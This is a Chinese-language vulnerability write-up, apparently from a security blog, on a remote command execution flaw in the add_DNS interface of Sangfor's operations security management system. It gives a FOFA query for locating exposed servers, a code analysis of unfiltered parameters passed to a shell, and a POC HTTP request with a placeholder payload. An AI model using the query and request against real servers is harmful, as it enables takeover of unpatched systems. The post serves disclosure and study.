---
title: "深信服运维安全管理系统 add_DNS 远程命令执行漏洞"
source: https://mrxn.net/jswz/sangfor_osm-netConfig-add_DNS-rce.html
asset_dir: assets/深信服运维安全管理系统-add_dns-远程命令执行漏洞
---

# 深信服运维安全管理系统 add\_DNS 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/2/4 21:37
- 572浏览
- [0评论](#comment)
- 7分钟阅读

深入探索

服务器

软件

SQL

---

# 漏洞简介

深信服运维安全管理系统 add\_DNS 接口存在远程[命令执行](https://mrxn.net/tag/rce)漏洞。攻击者可通过构造恶意的请求，利用该漏洞在目标服务器上执行任意命令，从而可能导致服务器被完全控制、敏感数据泄露等严重后果。影响范围包括所有运行存在该漏洞版本的深信服运维安全管理系统的服务器。

安全研究工具

# 影响版本

低于 3.0.12 20241106

# fofa语法

> body="/fort/login" && header="FORTSESSIONID"

# 漏洞分析

看下 `com.sbr.fort.web.controller.system.netconfig.NetConfigController#add_DNS`的实现逻辑

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-001-2727a8611fb6.webp)](https://image.mrxn.net/5f2a9f85bcfe4920a91fe232d32bcfc8.webp)

两个参数**firstAddress**与**prepareAddress**被直接拼接在**shell**中，然后调用`ShellExecutor`类的`exe`方法进行执行，未任何过滤或校验，从而造成[命令执行](https://mrxn.net/tag/rce)漏洞（两个参数均存在命令执行漏洞）。

漏洞预警服务

深入探索

云安全解决方案

文件大小转换

物流软件安全

# 漏洞复现

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-002-95edf58edb9c.webp)](https://image.mrxn.net/4c6f5f6e3a4f4370a520ceda847556a4.webp)

## POC

> 多个参数均存在命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，这里以firstAddress为例
>
> 计算机服务器

```
POST /fort/system;help/netConfig/add_DNS HTTP/1.1
Host: sangfor_osm.mrxn.net
Content-Type: application/x-www-form-urlencoded

firstAddress=RCE_POC&prepareAddress=8.8.8.8
```

访问命令执行结果文件

[![深信服运维安全管理系统 add_DNS 远程命令执行漏洞](images/img-003-1612ccbd0777.webp)](https://image.mrxn.net/a12faa3a914f4406a2b5483dde20e36b.webp)

成功得到[命令执行](https://mrxn.net/tag/rce)结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.POC](#toc-5-1-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALd0lEQVR4Aeyci1Yrxw5E2fn/f851TVE96pdtCAf7JsNClFQqqZvWNDbkrPz18fHx93ft78+P1H+GB4xc4hUeBbcvyd3c6XOXC7/CsUnVJFc5+eGFimXyV6ZcLPnE30UN5FZ7fb7LCbSB3Cb88aztNg98gG2nWa0B92vUK3XyZbCviRb2Gtjn1L8a9FpwnHWEVS9f3LMmfawNJMSFrz2BaSDg6cOMu63mSaj5Fac8PO4Lew04l/4rBGu03s5SN+bBtcD0E2PUPhPD2Q96f1U/DWQlurjfO4EfGQh48nXb0HN5IitGH26MwwvB/eTLogXzQKj2ZDdi4QDH6516VVtItxS4B7DVfDXxIwP56qKXfn8Cf2wgeeqA40mEGcdtjTU1P+bA/aoGzIGx5nY+WAvGrCMEc9DjrtdP8H9sID+xuf9ijz8zkP/iSf7Q9zwNRFd1Z4/WrHXgax4utYkrgrWjJrEQ1praJ770ssTg2sQrlF4G1gIKO1vVheuEJUh+hUXW3GkgLXM5LzmBNhBg++ILfe6ndgrum6cHHKc/OIbzl7TkgnBqwj2D4LpRm70Ik5Mvg74GHAORNgS+dZ5tIK3T5bz0BP7S5L9r2Xnq4XwqkgNzie/h2CexENZ9lIuNvcE1yYNjYJQuf5lMXcS7WPyoEfcdu25ITvJNcDsQ4PgZuNonrHOrJyL1yYFrgaSOdeCMV9pwKQJaHfR+NCOmhzA56GvhjEfNLg5fEc4+0PvRQc8DH9uBfFwfLzmBv8BTGlfXUyQD54EmES8Djqe0JYoD65zqRksZrGuUB+dSK25n0QTBtVWf3IhVs/NTU/PQrxHNCqHX1j7/Tzek7vtf618DebPRtre94GsEPdYrl72DNYlXWOvkRwOuBUJNCDz8UaieO4O+PjowDydmcTAXrRB6DhzDjOkTBGsSC6HntIZMudh1Q3ISb4LbgWhyMvBU4UTx1eDMgf18f+AYjOGFMHPi01t+bMUpB+4BKDwsWqC7aeGFh/D2BXrNjWqf0slCyN9ZNND3A8dAJNMvobXndiCt+nJ+9QTaQOqU5APH0yU/lp2Bc2AMXxGcG2sTC6OXXy38CqNLLrEQvGZyQZh56VcG1sKM6bfC9Frldhx4jZpvA6nk5b/uBNpAoJ/WauLhgtn2GIcXgvs+o5H+T9hqbfC+7q2XuiDsa8C5aIOr/tBrwTFw/enk480+2g15s3393nbebKU2kHtXbNwz+IqNfI3HfrCviRb2GnAOeqxrxgdrEgfBPBCqIXC8iWlEccC57LOkJhesTSI1wnBBsFa5WBtIRBe+9gTaQMDTgj1mq5lmMHxFcJ97mujhsTZ9RgTXAmk3/eIFTE9/+rSihQOuixYcg7GWRFO50Y9mRHA/4HpR/3izj3ZDxn1lipWHc5JATW19oHs6wTHwsCZ7EEYMHP3AqFxs1IRfYbTBexro10rNCtMHXFM1MHM1L387ECUv+/0TmAaSCWcriVcIjyeeunv9khsR3B9OHDU1HtequZ0PZ2+gk/2TfmkEtBu94uD8N2dabxpIii58zQk8HAicE4bez5bBvCY8GvS51AjBOfnVxh6Kk5cvS7xC5WXJgdeBE5OTTpa4IlivvKzmdr501aqu8vKTA68DXO+yPv7Mx7e7Prwh3+58FX7rBKZ/BgS+PummqxVbccqFX6HyMnBfODF65WWJ4dSA/TEnvSx8RehrpBsterA2eXAMRNIQOF6gG1EccA56TF9hkR+uONkRfH65bsjnQbwLtIFoUrJxY3BOPDk4OSB0h8DxNIFRvXfWFd6C6G7u9hPcF2bcFcGszVrgXK1NrnLVB9cAle58oDsHoOWBI9eIm9MGcvOvzzc4gTYQ8LTyVIDjusfkRqya+KMG5n5gDtaYXsL0ky9LvELlZeC+8ncG1qRP1YFz4aIJhheGG1G5WHKJV9gGskpe3O+fQPuXi19ZGvon514tWPvM05E+X9GC+wMpb5g+wPSzuok+Hfg9zeeS038mEH/dEJ3CG9k1kDcahrbSBrK63hKsLNpVbsfB/CMhfYKphVkLMyd9aoWKq0FfI81o0YdP/F281wf6/UAfa802EAWXvf4E2p9OwNPKhIN1i2AN9BgN9DyQVHsBA44XWJhxXDOxsDX6dGCuB3OfkgnAeaDl1FsGHPtqiZsjXgZz7pbuPsEa6LGK1EtWOfniYtcN0Ym8kbWBZELZG3jS4YXJyf+qgfulh3DsIa4auAZo9FhT44gqJz98ReC4EWCUbjToc7VeftUrftag7wuOgeu/h3y82Ue7IdkXeFqJK+aJgF4DjuHE1IG5xBXBOegx61SsdY98cL9RV/uNfrTgWiBUw9Q0YuFEE6wS4LiVYy6xcBpIbXD5v38CbSDg6WULmpYMzANJtXdMjXjCUS9ZlSqWhZMvS3wPgeNpqxrVyipXfXAN7LHq1UsWDlw3xkCoY09wxqofrYk/HaDVtYF85i548Qm8YCAv/o7ffPn2195cq+wXfI3CC8dc4qA0Mejro1lhala5cM9oog3C83tITdYRguvBGM0KpZclB66BE5MLgnOJhdcN0Sm8kU0D0ZRlqz2CJ6q8LBr5ssRCxTJwDRjFxcCc9DJYx4DShwHHC+DYAzjyqy/AUVNzqQ/WXPzkRlzlV9yuLtpg1U0DiejC15zA9MfFcRvgpwtoKeB44sDYEsWBPpenoEiaC9aOmsTCJv6Co7pqz5SC9wJs5UD3/QNNCxy5EOAYCDUhcNQA159OPt7s41s/supTJx884fq9ia8Ge03qoNeAYzgx2mcQzjpgWQIcT2fda3xwDoxpkHzin8RvDeQnN3D16k/gGkh/Hi+Ppl8MYX09dU2zW7AGjMrJkheCc/Jlysvkx8Aa8bIdX3PRBJWTyVZc5ZMXgteWLwPHcKJqq0knA2tqDswpX+2epubiXzeknt4b+N9625tpBmH9dOj7g31OeRk81mQt6WXgGphReRk4N9Yqt+LEVwPXg7Hm5IN5QOFDG9cEjjcUcOJ1Qx4e4+8KpteQTDFYtxMOPNGakw/mAYWHpeYIbl+A9lTcwuNz1IyxROC65ILKxcKBteGhj8NXTO09hL7PSpueYC2cOOZSH1543RCdwhtZGwick4TTX+11NdmV7qtc+sK5Ptgfc+kdXrjiKp+8EPq+4r5q4B5wotaTpZf8GFi3i8W3gaTBha89gfYuS9Opdm9b4ElHk7rEFWGtVU100GvCV4ReA47hMWqtnYHrsxY4hhmjSa/EFcF14cAxEOouXjfk7vH8fvIayN0z//1ke9s7Lp1rWTGacImB461seGFy8mVgTfgVgjXSjzbqx3yNow2XGNwfCPXUP2ka+7Ti4kQzYpFMa0ULHOcHXP895OPNPtqLOpxTguf8fC+rSYeLJghn70ea1NxDOPuNOnBu5BXDPqf8ynb7rVp43Bd6TfoKr9eQeppv4LeBaDrP2m7ftT4a8NOQXPiKyQVr7pGfGuFOC/0eqhacA6NysV2/e/wztdGA14QT20DuLXLlfu8EpoHAOS3o/a9sC1w7Pg2rHmAtGKMBx3D+b/BWOTh1QCTtXU320BIL5xlNyoDjXVFiIZiDHpWLgXOJs2bFaSARX/iaE7gG8ppz3676IwMBX0U4MSuCuVzL8CscNYmF0cuvFr5i8pV7Jx98Jqs9/chAVo0v7nsn8CMDWT2RIwd+KsILxy2DNeHBMcwYTUX1lIWDvi58Rell0GvhfCMBfa7Wj756yUa+xsrLwsHZ/0cGksYX/vMTmAaiye3sK8uBpz72AvNwYjT3+kcTBNfXGpi5VR7mpz+69BeuuMonLxQvk19N3Gg1L7/mp4FIcNnrTqANBPx0wWPcbbdOOv6oDV8RvGa41CQWhguKkyX+DQTvM2tp/Rg4B8ZowDEQqiEw/YLZBtJUl/PSE7gG8tLjnxf/HwAAAP//YtljdAAAAAZJREFUAwAQVWaSoaru4wAAAABJRU5ErkJggg==)

手机扫码阅读
